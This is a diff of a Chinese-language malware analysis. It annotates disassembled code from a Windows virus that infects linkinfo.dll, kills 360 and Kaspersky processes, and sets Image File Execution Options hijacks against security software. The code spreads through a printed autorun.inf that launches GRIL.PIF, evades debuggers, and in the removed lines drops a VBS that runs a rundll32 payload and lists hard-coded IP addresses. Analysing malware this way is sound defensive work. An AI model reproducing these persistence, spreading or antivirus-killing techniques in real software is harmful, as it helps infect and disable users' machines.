+
+创建了大量的安全软件的镜像劫持
+
+`HKEY_LOCAL_MACHINESOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\安全软件`
+
+和修改注册表表使隐藏文件属性失效，删除注册表相关键值破坏安全模式，阻止用户进入安全模
+
+### 4. 感染 `\linkinfo.dll` 文件
+
+#### 汇编代码片段
+
+```
+(四)、 push    13141360  感染"\linkinfo.dll"文件  
+
+13141360  /.  55          push    ebp  
+
+13141361  |.  8BEC        mov     ebp, esp  
+
+13141363  |.  81EC 08020000 sub     esp, 208  
+
+13141369  |.  53          push    ebx  
+
+1314136A  |.  56          push    esi  
+
+1314136B  |.  57          push    edi  
+
+1314136C  |.  90          nop  
+
+1314136D  |.  8D85 F8FDFFFF lea     eax, dword ptr [ebp-208]  
+
+13141373  |.  68 04010000 push    104                            ; /BufSize = 104 (260.)  
+
+13141378  |.  50          push    eax                            ; |Buffer  
+
+13141379  |.  FF15 84301413 call    dword ptr [13143084]               ; \\GetSystemDirectoryA  
+
+1314137F  |.  90          nop  
+
+13141380  |.  83C9 FF     or      ecx, FFFFFFFF  
+
+13141383  |.  8DBD F8FDFFFF lea     edi, dword ptr [ebp-208]  
+
+13141389  |.  33C0        xor     eax, eax  
+
+1314138B  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+
+13141391  |.  F2:AE       repne   scas byte ptr es:[edi]  
+
+13141393  |.  F7D1        not     ecx  
+
+13141395  |.  2BF9        sub     edi, ecx  
+
+13141397  |.  8BC1        mov     eax, ecx  
+
+13141399  |.  8BF7        mov     esi, edi  
+
+1314139B  |.  8BFA        mov     edi, edx  
+
+1314139D  |.  8D95 F8FDFFFF lea     edx, dword ptr [ebp-208]  
+
+131413A3  |.  C1E9 02     shr     ecx, 2  
+
+131413A6  |.  F3:A5       rep     movs dword ptr es:[edi], dword p>  
+
+131413A8  |.  8BC8        mov     ecx, eax  
+
+131413AA  |.  33C0        xor     eax, eax  
+
+131413AC  |.  83E1 03     and     ecx, 3  
+
+131413AF  |.  F3:A4       rep     movs byte ptr es:[edi], byte ptr>  
+
+131413B1  |.  BF CCD81413 mov     edi, 1314D8CC                      ;  ASCII "\linkinfo.dll"  
+
+131413B6  |.  83C9 FF     or      ecx, FFFFFFFF  
+
+131413B9  |.  F2:AE       repne   scas byte ptr es:[edi]  
+
+131413BB  |.  F7D1        not     ecx  
+
+131413BD  |.  2BF9        sub     edi, ecx  
+
+131413BF  |.  8BF7        mov     esi, edi  
+
+131413C1  |.  8BD9        mov     ebx, ecx  
+
+131413C3  |.  8BFA        mov     edi, edx  
+
+131413C5  |.  83C9 FF     or      ecx, FFFFFFFF  
+
+131413C8  |.  F2:AE       repne   scas byte ptr es:[edi]  
+
+131413CA  |.  8BCB        mov     ecx, ebx  
+
+131413CC  |.  4F          dec     edi  
+
+131413CD  |.  C1E9 02     shr     ecx, 2  
+
+131413D0  |.  F3:A5       rep     movs dword ptr es:[edi], dword p>  
+
+131413D2  |.  8BCB        mov     ecx, ebx  
+
+131413D4  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+
+131413DA  |.  83E1 03     and     ecx, 3  
+
+131413DD  |.  F3:A4       rep     movs byte ptr es:[edi], byte ptr>  
+
+131413DF  |.  BF B4D81413 mov     edi, 1314D8B4                      ;  ASCII "\dllcache\linkinfo.dll"  
+
+131413E4  |.  83C9 FF     or      ecx, FFFFFFFF  
+
+131413E7  |.  F2:AE       repne   scas byte ptr es:[edi]  
+
+131413E9  |.  F7D1        not     ecx  
+
+131413EB  |.  2BF9        sub     edi, ecx  
+
+131413ED  |.  8BF7        mov     esi, edi  
+
+131413EF  |.  8BD9        mov     ebx, ecx  
+
+131413F1  |.  8BFA        mov     edi, edx  
+
+131413F3  |.  83C9 FF     or      ecx, FFFFFFFF  
+
+131413F6  |.  F2:AE       repne   scas byte ptr es:[edi]  
+
+131413F8  |.  8BCB        mov     ecx, ebx  
+
+131413FA  |.  4F          dec     edi  
+
+131413FB  |.  C1E9 02     shr     ecx, 2  
+
+131413FE  |.  F3:A5       rep     movs dword ptr es:[edi], dword p>  
+
+13141400  |.  8BCB        mov     ecx, ebx  
+
+13141402  |.  8D85 FCFEFFFF lea     eax, dword ptr [ebp-104]  
+
+13141408  |.  83E1 03     and     ecx, 3  
+
+1314140B  |.  50          push    eax                            ; /FileName  
+
+1314140C  |.  F3:A4       rep     movs byte ptr es:[edi], byte ptr>; |  
+
+1314140E  |.  FF15 88301413 call    dword ptr [13143088]               ; \\GetFileAttributesA  
+
+13141414  |.  5F          pop     edi  
+
+13141415  |.  5E          pop     esi  
+
+13141416  |.  83F8 FF     cmp     eax, -1  
+
+13141419  |.  5B          pop     ebx  
+```
+
+
+
+(五)、结束 360 相关的安全文件
+
+```
+1314141A  |.  75 26          jnz     short 13141442
+1314141C  |.  8D8D FCFEFFFF lea     ecx, dword ptr [ebp-104]
+13141422  |.  6A 00         push    0                     ; /FailIfExists = FALSE
+13141424  |.  8D95 F8FDFFFF lea     edx, dword ptr [ebp-208]          ; |
+1314142A  |.  51            push    ecx                   ; |NewFileName
+1314142B  |.  52            push    edx                   ; |ExistingFileName
+1314142C  |.  FF15 90301413 call    dword ptr [13143090]               ; \CopyFileA
+13141432  |.  68 28A00000  push    0A028                   ; /Timeout = 41000. ms
+13141437  |.  FF15 A4301413 call    dword ptr [131430A4]               ; \Sleep
+1314143D  |.  E8 DE070000  call    13141C20
+13141442  |>  B8 01000000  mov     eax, 1
+13141447  |.  8BE5          mov     esp, ebp
+13141449  |.  5D            pop     ebp
+1314144A  \.  C2 0400       retn    4
+
+13142350   .  56             push    esi
+13142351   .  8B35 A4301413 mov     esi, dword ptr [131430A4]         ; kernel32.Sleep
+13142357   >  68 C8DE1413   push    1314DEC8                   ; ASCII "360tray.exe"
+1314235C   .  E8 4FFFFFFF    call    131422B0                   ;遍历进程查找 360tray.exe
+13142361   .  83C4 04       add     esp, 4
+13142364   .  85C0          test    eax, eax
+13142366   .  74 05        je      short 1314236D
+13142368   .  E8 73FBFFFF   call    13141EE0                   ;比较是否找到 360tray.Exe，找到释放驱动，结束 360 相关的安全软件
+
+{
+13141EE0  /$  55             push    ebp
+13141EE1  |.  8BEC          mov     ebp, esp
+13141EE3  |.  81EC E0010000 sub     esp, 1E0
+13141EE9  |.  53            push    ebx
+13141EEA  |.  56            push    esi
+13141EEB  |.  57            push    edi
+13141EEC  |.  8D85 20FEFFFF lea     eax, dword ptr [ebp-1E0]
+13141EF2  |.  68 04010000   push    104                     ; /BufSize = 104 (260.)
+13141EF7  |.  50            push    eax                   ; |Buffer
+13141EF8  |.  FF15 94301413 call    dword ptr [13143094]               ; \GetWindowsDirectoryA
+13141EFE  |.  BF D4DE1413   mov     edi, 1314DED4                  ;  ASCII "\\Fonts\\lubb.fon"
+13141F03  |.  83C9 FF       or      ecx, FFFFFFFF
+13141F06  |.  33C0          xor     eax, eax
+13141F08  |.  8D95 20FEFFFF lea     edx, dword ptr [ebp-1E0]
+13141F0E  |.  F2:AE        repne   scas  byte ptr es:[edi]
+13141F10  |.  F7D1        not     ecx
+13141F12  |.  2BF9        sub     edi, ecx
+13141F14  |.  8BF7        mov     esi, edi
+13141F16  |.  8BD9        mov     ebx, ecx
+13141F18  |.  8BFA        mov     edi, edx
+13141F1A  |.  83C9 FF       or      ecx, FFFFFFFF
+13141F1D  |.  F2:AE        repne   scas  byte ptr es:[edi]
+13141F1F  |.  8BCB        mov     ecx, ebx
+13141F21  |.  4F          dec     edi
+13141F22  |.  C1E9 02       shr     ecx, 2
+13141F25  |.  F3:A5       rep     movs  dword ptr es:[edi], dword p>
+13141F27  |.  8BCB        mov     ecx, ebx
+13141F29  |.  8D85 20FEFFFF lea     eax, dword ptr [ebp-1E0]
+13141F2F  |.  83E1 03       and     ecx, 3
+13141F32  |.  50            push    eax
+13141F33  |.  F3:A4       rep     movs  byte ptr es:[edi], byte ptr>
+13141F35  |.  E8 B6FEFFFF   call    13141DF0
+13141F3A  |.  83C4 04       add     esp, 4
+13141F3D  |.  68 F4010000   push    1F4                     ; /Timeout = 500. ms
+13141F42  |.  FF15 A4301413 call    dword ptr [131430A4]               ; \Sleep
+13141F48  |.  90            nop
+13141F49  |.  90            nop
+13141F4A  |.  90            nop
+13141F4B  |.  68 C8DE1413   push    1314DEC8                   ;  ASCII "360tray.exe"
+13141F50  |.  E8 FBFEFFFF   call    13141E50                   ；结束进程
+13141F55  |.  68 BCDE1413   push    1314DEBC                   ;  ASCII "360Safe.exe"
+13141F5A  |.  8945 EC       mov     dword ptr [ebp-14], eax
+13141F5D  |.  E8 EEFEFFFF   call    13141E50
+13141F62  |.  68 ACDE1413   push    1314DEAC                   ;  ASCII "safeboxTray.exe"
+13141F67  |.  8945 F0       mov     dword ptr [ebp-10], eax
+13141F6A  |.  E8 E1FEFFFF   call    13141E50
+13141F6F  |.  68 9CDE1413   push    1314DE9C                   ;  ASCII "360safebox.exe"
+13141F74  |.  8945 F8       mov     dword ptr [ebp-8], eax
+13141F77  |.  E8 D4FEFFFF   call    13141E50
+13141F7C  |.  83C4 10       add     esp, 10
+13141F7F  |.  8945 F4       mov     dword ptr [ebp-C], eax
+13141F82  |.  6A 00         push    0
+13141F84  |.  6A 00         push    0
+13141F86  |.  6A 03         push    3
+13141F88  |.  6A 00         push    0
+13141F8A  |.  6A 00         push    0
+13141F8C  |.  68 000000C0   push    C0000000
+13141F91  |.  68 94DE1413   push    1314DE94                   ; |FileName = "\\\\.\\SKD"
+13141F96  |.  FF15 58301413 call    dword ptr [13143058]               ; \CreateFileA
+13141F9C  |.  8BD8        mov     ebx, eax
+
+      ................................................................................................
+}
+
+1314236D   >  68 30750000   push    7530
+13142372   .  FFD6          call    esi
+13142374   .^ EB E1        jmp     short 13142357
+```
+
+(六)、创建 AVP 镜像劫持
+
+```
+13141070   .  68 50C30000   push    0C350                   ; /Timeout = 50000. ms
+13141075   .  FF15 A4301413 call    dword ptr [131430A4]               ; \Sleep
+1314107B   .  68 0CD71413   push    1314D70C                   ;  ASCII "avp.EXE"
+13141080   .  E8 FB120000   call    13142380                   ;创建 AVP 镜像劫持
+ ; HKEY_LOCAL_MACHINESOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AVP.EXE
+13141085   .  83C4 04       add     esp, 4
+13141088   .  E8 B30A0000   call    13141B40                   ;释放驱动 C:\WINDOWS\fonts\lvbasb.sys，结束 AVP.EXE 进程
+1314108D   .  C2 0400       retn    4
+13141090   .  E8 6BFFFFFF   call    13141000
+13141095   .  B8 01000000   mov     eax, 1
+1314109A   .  C2 0400       retn    4
+```
+
+(七)、遍历磁盘释放 autorun.Inf 和复制病毒本身为 GRIL.PIF，实现病毒程序的自动运行。
+
+```
+131414C0   56             push    esi
+131414C1   8B35 A4301413  mov     esi, dword ptr [131430A4]         ; kernel32.Sleep
+131414C7   68 30750000    push    7530
+131414CC   FFD6           call    esi                   ;sleep 30 秒
+131414CE   E8 9DFFFFFF    call    13141470                   ；遍历磁盘释放 autorun.Inf 和复制病毒本身为
+                                                               GRIL.PIF，实现病毒程序的自动运行。
+
+AutoRun.Inf 的内容
+
+[AutoRun]
+
+shell\open=打开(&O)
+shell\open\Command=GRIL.PIF
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\command=GRIL.PIF
+
+131414D3  ^ EB F2         jmp     short 131414C7
+```
+
+(八)、`%temp%\dll2.tmp` 动态连接库分析
+
+```
+10002520   55             push    ebp
+10002521   8BEC           mov     ebp, esp
+10002523   8B45 0C        mov     eax, dword ptr [ebp+C]
+10002526   83F8 01        cmp     eax, 1
+10002529   75 69         jnz     short 10002594
+1000252B   8B45 08        mov     eax, dword ptr [ebp+8]
+1000252E   50             push    eax
+1000252F   FF15 44100010  call    dword ptr [10001044]               ; kernel32.DisableThreadLibraryCalls
+10002535   E8 56FAFFFF    call    10001F90                   ；检测是否被调试
+1000253A   85C0           test    eax, eax
+1000253C   74 08         je      short 10002546
+1000253E   6A 01         push    1
+```
+
+
+
+```asm
+10002540    FF15 A4100010   call    dword ptr [100010A4]             ; kernel32.ExitProcess  
+
+10002546    56              push    esi  
+
+10002547    72 03           jb      short 1000254C  
+
+10002549    73 01           jnb     short 1000254C  
+
+1000254B    E8 E85F0E00     call    100E8538                         ；设置 "SeDebugPrivilege"，提升权限  
+
+10002550    008B 35541000   add     byte ptr [ebx+105435], cl  
+
+10002556    106A 00         adc     byte ptr [edx], ch  
+
+10002559    6A 00           push    0  
+
+1000255B    6A 00           push    0  
+
+1000255D    68 00220010     push    10002200  
+
 {  
-  lsnsts.VBS 的内容  
-  Set wshshell=wscript.CreateObject("WScript.Shell")  
-  wshshell.run "rundll32 C:\\sam.dll,RSDK",0   
-}  
-  
-131411E1  |.  83C9 FF       or      ecx, FFFFFFFF  
-131411E4  |.  33C0          xor     eax, eax  
-131411E6  |.  8D95 FCFEFFFF lea     edx, dword ptr \[ebp-104\]  
-131411EC  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-131411EE  |.  F7D1          not     ecx  
-131411F0  |.  2BF9          sub     edi, ecx  
-131411F2  |.  68 A4D71413   push    1314D7A4                         ; /mode = "w+"  
-131411F7  |.  8BF7          mov     esi, edi                         ; |  
-131411F9  |.  8BFA          mov     edi, edx                         ; |  
-131411FB  |.  8BD1          mov     edx, ecx                         ; |  
-131411FD  |.  83C9 FF       or      ecx, FFFFFFFF                    ; |  
-13141200  |.  F2:AE         repne   scas byte ptr es:\[edi\]           ; |  
-13141202  |.  8BCA          mov     ecx, edx                         ; |  
-13141204  |.  4F            dec     edi                              ; |  
-13141205  |.  C1E9 02       shr     ecx, 2                           ; |  
-13141208  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword p>; |  
-1314120A  |.  8BCA          mov     ecx, edx                         ; |  
-1314120C  |.  8D85 FCFEFFFF lea     eax, dword ptr \[ebp-104\]         ; |  
-13141212  |.  83E1 03       and     ecx, 3                           ; |  
-13141215  |.  50            push    eax                              ; |path  
-13141216  |.  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>; |  
-13141218  |.  E8 B1120000   call    131424CE                         ; \\fopen  
-1314121D  |.  8BF0          mov     esi, eax  
-1314121F  |.  83C4 08       add     esp, 8  
-13141222  |.  85F6          test    esi, esi  
-13141224  |.  74 1F         je      short 13141245  
-13141226  |.  56            push    esi                              ; /stream  
-13141227  |.  68 18D81413   push    1314D818               ; |s = "Setwshshell=wscript.CreateObject(""WScript.Shell"")",LF,""  
-1314122C  |.  E8 A3120000   call    131424D4                         ; \\fputs  
-13141231  |.  56            push    esi                              ; /stream  
-13141232  |.  68 ECD71413   push    1314D7EC               ; |s = "wshshell.run ""rundll32 C:\\sam.dll,RSDK"",0"  
-13141237  |.  E8 98120000   call    131424D4                         ; \\fputs  
-1314123C  |.  56            push    esi                              ; /stream  
-1314123D  |.  E8 80120000   call    131424C2                         ; \\fclose  
-13141242  |.  83C4 14       add     esp, 14  
-13141245  |>  68 B0040000   push    4B0  
-1314124A  |.  FFD3          call    ebx  
-1314124C  |.  6A 00         push    0                                ; /IsShown = 0  
-1314124E  |.  8D8D FCFEFFFF lea     ecx, dword ptr \[ebp-104\]         ; |  
-13141254  |.  6A 00         push    0                                ; |DefDir = NULL  
-13141256  |.  51            push    ecx                              ; |Parameters  
-13141257  |.  68 E0D71413   push    1314D7E0                         ; |FileName = "cscript.exe"  
-1314125C  |.  68 D8D71413   push    1314D7D8                         ; |Operation = "open"  
-13141261  |.  6A 00         push    0                                ; |hWnd = NULL  
-13141263  |.  FF15 E8301413 call    dword ptr \[131430E8\]             ; \\ShellExecuteA  
-13141269  |.  68 88130000   push    1388  
-1314126E  |.  FFD3          call    ebx  
-13141270  |.  8D95 FCFEFFFF lea     edx, dword ptr \[ebp-104\]  
-13141276  |.  52            push    edx                              ; /FileName  
-13141277  |.  FF15 98301413 call    dword ptr \[13143098\]             ; \\DeleteFileA  
-1314127D  |.  5F            pop     edi  
-1314127E  |.  5E            pop     esi  
-1314127F  |.  5B            pop     ebx  
-13141280  |.  8BE5          mov     esp, ebp  
-13141282  |.  5D            pop     ebp  
-13141283  |.  C3            retn  
-13141284    6A 00           push    0  
-13141286    6A 00           push    0  
-13141288    68 C8D71413     push    1314D7C8                         ; ASCII "C:\\sam.dll,RSDK"  
-1314128D    68 B8D71413     push    1314D7B8                         ; ASCII "rundll32.exe"  
-13141292    68 D8D71413     push    1314D7D8                         ; ASCII "open"  
-13141297    6A 00           push    0  
-13141299    FF15 E8301413   call    dword ptr \[131430E8\]             ; SHELL32.ShellExecuteA  
-1314129F    5B              pop     ebx  
-131412A0    8BE5            mov     esp, ebp  
-131412A2    5D              pop     ebp  
-131412A3    C3              retn  
-  
-  
-(三)、13141678   .  68 90101413   push    13141090 释放 DLL12.TEM 的动态链接库  
-  
-释放 DLL12.TEM 的动态链接库，在动态库中释放 isb.Ini 地址列表，创建了大量的安全软件的镜像劫持  
-ver2  
-61.135.189.52  
-220.181.19.70  
-118.228.148.28  
-221.236.12.230  
-121.14.0.58  
-211.65.195.65  
-219.234.81.61  
-203.184.141.226  
-222.35.250.144  
-domains  
-echo.acc.sogou.Com  
-  
-创建了大量的安全软件的镜像劫持  
-HKEY\_LOCAL\_MACHINESOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\安全软件  
-和修改注册表表使隐藏文件属性失效，删除注册表相关键值破坏安全模式，阻止用户进入安全模  
-  
-  
-(四)、 push    13141360  感染"\\linkinfo.dll"文件   
-  
-13141360  /.  55            push    ebp  
-13141361  |.  8BEC          mov     ebp, esp  
-13141363  |.  81EC 08020000 sub     esp, 208  
-13141369  |.  53            push    ebx  
-1314136A  |.  56            push    esi  
-1314136B  |.  57            push    edi  
-1314136C  |.  90            nop  
-1314136D  |.  8D85 F8FDFFFF lea     eax, dword ptr \[ebp-208\]  
-13141373  |.  68 04010000   push    104                              ; /BufSize = 104 (260.)  
-13141378  |.  50            push    eax                              ; |Buffer  
-13141379  |.  FF15 84301413 call    dword ptr \[13143084\]             ; \\GetSystemDirectoryA  
-1314137F  |.  90            nop  
-13141380  |.  83C9 FF       or      ecx, FFFFFFFF  
-13141383  |.  8DBD F8FDFFFF lea     edi, dword ptr \[ebp-208\]  
-13141389  |.  33C0          xor     eax, eax  
-1314138B  |.  8D95 FCFEFFFF lea     edx, dword ptr \[ebp-104\]  
-13141391  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-13141393  |.  F7D1          not     ecx  
-13141395  |.  2BF9          sub     edi, ecx  
-13141397  |.  8BC1          mov     eax, ecx  
-13141399  |.  8BF7          mov     esi, edi  
-1314139B  |.  8BFA          mov     edi, edx  
-1314139D  |.  8D95 F8FDFFFF lea     edx, dword ptr \[ebp-208\]  
-131413A3  |.  C1E9 02       shr     ecx, 2  
-131413A6  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword p>  
-131413A8  |.  8BC8          mov     ecx, eax  
-131413AA  |.  33C0          xor     eax, eax  
-131413AC  |.  83E1 03       and     ecx, 3  
-131413AF  |.  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>  
-131413B1  |.  BF CCD81413   mov     edi, 1314D8CC                    ;  ASCII "\\linkinfo.dll"  
-131413B6  |.  83C9 FF       or      ecx, FFFFFFFF  
-131413B9  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-131413BB  |.  F7D1          not     ecx  
-131413BD  |.  2BF9          sub     edi, ecx  
-131413BF  |.  8BF7          mov     esi, edi  
-131413C1  |.  8BD9          mov     ebx, ecx  
-131413C3  |.  8BFA          mov     edi, edx  
-131413C5  |.  83C9 FF       or      ecx, FFFFFFFF  
-131413C8  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-131413CA  |.  8BCB          mov     ecx, ebx  
-131413CC  |.  4F            dec     edi  
-131413CD  |.  C1E9 02       shr     ecx, 2  
-131413D0  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword p>  
-131413D2  |.  8BCB          mov     ecx, ebx  
-131413D4  |.  8D95 FCFEFFFF lea     edx, dword ptr \[ebp-104\]  
-131413DA  |.  83E1 03       and     ecx, 3  
-131413DD  |.  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>  
-131413DF  |.  BF B4D81413   mov     edi, 1314D8B4                    ;  ASCII "\\dllcache\\linkinfo.dll"  
-131413E4  |.  83C9 FF       or      ecx, FFFFFFFF  
-131413E7  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-131413E9  |.  F7D1          not     ecx  
-131413EB  |.  2BF9          sub     edi, ecx  
-131413ED  |.  8BF7          mov     esi, edi  
-131413EF  |.  8BD9          mov     ebx, ecx  
-131413F1  |.  8BFA          mov     edi, edx  
-131413F3  |.  83C9 FF       or      ecx, FFFFFFFF  
-131413F6  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-131413F8  |.  8BCB          mov     ecx, ebx  
-131413FA  |.  4F            dec     edi  
-131413FB  |.  C1E9 02       shr     ecx, 2  
-131413FE  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword p>  
-13141400  |.  8BCB          mov     ecx, ebx  
-13141402  |.  8D85 FCFEFFFF lea     eax, dword ptr \[ebp-104\]  
-13141408  |.  83E1 03       and     ecx, 3  
-1314140B  |.  50            push    eax                              ; /FileName  
-1314140C  |.  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>; |  
-1314140E  |.  FF15 88301413 call    dword ptr \[13143088\]             ; \\GetFileAttributesA  
-13141414  |.  5F            pop     edi  
-13141415  |.  5E            pop     esi  
-13141416  |.  83F8 FF       cmp     eax, -1  
-13141419  |.  5B            pop     ebx  
-1314141A  |.  75 26         jnz     short 13141442  
-1314141C  |.  8D8D FCFEFFFF lea     ecx, dword ptr \[ebp-104\]  
-13141422  |.  6A 00         push    0                                ; /FailIfExists = FALSE  
-13141424  |.  8D95 F8FDFFFF lea     edx, dword ptr \[ebp-208\]         ; |  
-1314142A  |.  51            push    ecx                              ; |NewFileName  
-1314142B  |.  52            push    edx                              ; |ExistingFileName  
-1314142C  |.  FF15 90301413 call    dword ptr \[13143090\]             ; \\CopyFileA  
-13141432  |.  68 28A00000   push    0A028                            ; /Timeout = 41000. ms  
-13141437  |.  FF15 A4301413 call    dword ptr \[131430A4\]             ; \\Sleep  
-1314143D  |.  E8 DE070000   call    13141C20  
-13141442  |>  B8 01000000   mov     eax, 1  
-13141447  |.  8BE5          mov     esp, ebp  
-13141449  |.  5D            pop     ebp  
-1314144A  \\.  C2 0400       retn    4  
-  
-  
-(五)、   push    13142350    结束 360 相关的安全文件   
-  
-13142350   .  56            push    esi  
-13142351   .  8B35 A4301413 mov     esi, dword ptr \[131430A4\]        ;  kernel32.Sleep  
-13142357   >  68 C8DE1413   push    1314DEC8                         ;  ASCII "360tray.exe"  
-1314235C   .  E8 4FFFFFFF   call    131422B0                         ;遍历进程查找 360tray.exe  
-13142361   .  83C4 04       add     esp, 4  
-13142364   .  85C0          test    eax, eax  
-13142366   .  74 05         je      short 1314236D  
-13142368   .  E8 73FBFFFF   call    13141EE0                         ;比较是否找到 360tray.Exe，找到释放驱动，结束 360 相关的安全软件  
-{  
-13141EE0  /$  55            push    ebp  
-13141EE1  |.  8BEC          mov     ebp, esp  
-13141EE3  |.  81EC E0010000 sub     esp, 1E0  
-13141EE9  |.  53            push    ebx  
-13141EEA  |.  56            push    esi  
-13141EEB  |.  57            push    edi  
-13141EEC  |.  8D85 20FEFFFF lea     eax, dword ptr \[ebp-1E0\]  
-13141EF2  |.  68 04010000   push    104                              ; /BufSize = 104 (260.)  
-13141EF7  |.  50            push    eax                              ; |Buffer  
-13141EF8  |.  FF15 94301413 call    dword ptr \[13143094\]             ; \\GetWindowsDirectoryA  
-13141EFE  |.  BF D4DE1413   mov     edi, 1314DED4                    ;  ASCII "\\Fonts\\lubb.fon"  
-13141F03  |.  83C9 FF       or      ecx, FFFFFFFF  
-13141F06  |.  33C0          xor     eax, eax  
-13141F08  |.  8D95 20FEFFFF lea     edx, dword ptr \[ebp-1E0\]  
-13141F0E  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-13141F10  |.  F7D1          not     ecx  
-13141F12  |.  2BF9          sub     edi, ecx  
-13141F14  |.  8BF7          mov     esi, edi  
-13141F16  |.  8BD9          mov     ebx, ecx  
-13141F18  |.  8BFA          mov     edi, edx  
-13141F1A  |.  83C9 FF       or      ecx, FFFFFFFF  
-13141F1D  |.  F2:AE         repne   scas byte ptr es:\[edi\]  
-13141F1F  |.  8BCB          mov     ecx, ebx  
-13141F21  |.  4F            dec     edi  
-13141F22  |.  C1E9 02       shr     ecx, 2  
-13141F25  |.  F3:A5         rep     movs dword ptr es:\[edi\], dword p>  
-13141F27  |.  8BCB          mov     ecx, ebx  
-13141F29  |.  8D85 20FEFFFF lea     eax, dword ptr \[ebp-1E0\]  
-13141F2F  |.  83E1 03       and     ecx, 3  
-13141F32  |.  50            push    eax  
-13141F33  |.  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>  
-13141F35  |.  E8 B6FEFFFF   call    13141DF0  
-13141F3A  |.  83C4 04       add     esp, 4  
-13141F3D  |.  68 F4010000   push    1F4                              ; /Timeout = 500. ms  
-13141F42  |.  FF15 A4301413 call    dword ptr \[131430A4\]             ; \\Sleep  
-13141F48  |.  90            nop  
-13141F49  |.  90            nop  
-13141F4A  |.  90            nop  
-13141F4B  |.  68 C8DE1413   push    1314DEC8                         ;  ASCII "360tray.exe"  
-13141F50  |.  E8 FBFEFFFF   call    13141E50                              ；结束进程  
-13141F55  |.  68 BCDE1413   push    1314DEBC                         ;  ASCII "360Safe.exe"  
-13141F5A  |.  8945 EC       mov     dword ptr \[ebp-14\], eax  
-13141F5D  |.  E8 EEFEFFFF   call    13141E50  
-13141F62  |.  68 ACDE1413   push    1314DEAC                         ;  ASCII "safeboxTray.exe"  
-13141F67  |.  8945 F0       mov     dword ptr \[ebp-10\], eax  
-13141F6A  |.  E8 E1FEFFFF   call    13141E50  
-13141F6F  |.  68 9CDE1413   push    1314DE9C                         ;  ASCII "360safebox.exe"  
-13141F74  |.  8945 F8       mov     dword ptr \[ebp-8\], eax  
-13141F77  |.  E8 D4FEFFFF   call    13141E50  
-13141F7C  |.  83C4 10       add     esp, 10  
-13141F7F  |.  8945 F4       mov     dword ptr \[ebp-C\], eax  
-13141F82  |.  6A 00         push    0                                
-13141F84  |.  6A 00         push    0                                  
-13141F86  |.  6A 03         push    3                                  
-13141F88  |.  6A 00         push    0                                  
-13141F8A  |.  6A 00         push    0                                  
-13141F8C  |.  68 000000C0   push    C0000000                          
-13141F91  |.  68 94DE1413   push    1314DE94                         ; |FileName = "\\\\.\\SKD"  
-13141F96  |.  FF15 58301413 call    dword ptr \[13143058\]             ; \\CreateFileA  
-13141F9C  |.  8BD8          mov     ebx, eax  
-       ................................................................................................  
-  
-}  
-1314236D   >  68 30750000   push    7530  
-13142372   .  FFD6          call    esi  
-13142374   .^ EB E1         jmp     short 13142357  
-  
-  
-(六)、push    13141070  创建 AVP 镜像劫持   
-  
-13141070   .  68 50C30000   push    0C350                            ; /Timeout = 50000. ms  
-13141075   .  FF15 A4301413 call    dword ptr \[131430A4\]             ; \\Sleep  
-1314107B   .  68 0CD71413   push    1314D70C                         ;  ASCII "avp.EXE"  
-13141080   .  E8 FB120000   call    13142380                         ;创建 AVP 镜像劫持  
- ; HKEY\_LOCAL\_MACHINESOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AVP.EXE  
-13141085   .  83C4 04       add     esp, 4  
-13141088   .  E8 B30A0000   call    13141B40                         ;释放驱动 C:\\WINDOWS\\fonts\\lvbasb.sys，结束 AVP.EXE 进程  
-1314108D   .  C2 0400       retn    4  
-13141090   .  E8 6BFFFFFF   call    13141000                           
-13141095   .  B8 01000000   mov     eax, 1  
-1314109A   .  C2 0400       retn    4  
-  
-  
-  
-(七)、push    131414C0  遍历磁盘释放 autorun.Inf 和复制病毒本身为 GRIL.PIF，实现病毒程序的自动运行。   
-  
-  
-131414C0    56              push    esi  
-131414C1    8B35 A4301413   mov     esi, dword ptr \[131430A4\]        ; kernel32.Sleep  
-131414C7    68 30750000     push    7530  
-131414CC    FFD6            call    esi                              ;sleep 30 秒  
-131414CE    E8 9DFFFFFF     call    13141470                         ；遍历磁盘释放 autorun.Inf 和复制病毒本身为  
-                                                                       GRIL.PIF，实现病毒程序的自动运行。  
-AutoRun.Inf 的内容  
-\[AutoRun\]  
-  
-shell\\open=打开(&O)  
-  
-shell\\open\\Command=GRIL.PIF  
-  
-shell\\open\\Default=1  
-  
-shell\\explore=资源管理器(&X)  
-  
-shell\\explore\\command=GRIL.PIF                   
-131414D3  ^ EB F2           jmp     short 131414C7  
-  
-  
-  
-(八)、%temp%\\dll2.tmp 动态连接库分析   
-  
-  
-10002520    55              push    ebp  
-10002521    8BEC            mov     ebp, esp  
-10002523    8B45 0C         mov     eax, dword ptr \[ebp+C\]  
-10002526    83F8 01         cmp     eax, 1  
-10002529    75 69           jnz     short 10002594  
-1000252B    8B45 08         mov     eax, dword ptr \[ebp+8\]  
-1000252E    50              push    eax  
-1000252F    FF15 44100010   call    dword ptr \[10001044\]             ; kernel32.DisableThreadLibraryCalls  
-10002535    E8 56FAFFFF     call    10001F90                         ；检测是否被调试  
-1000253A    85C0            test    eax, eax  
-1000253C    74 08           je      short 10002546  
-1000253E    6A 01           push    1  
-10002540    FF15 A4100010   call    dword ptr \[100010A4\]             ; kernel32.ExitProcess  
-10002546    56              push    esi  
-10002547    72 03           jb      short 1000254C  
-10002549    73 01           jnb     short 1000254C  
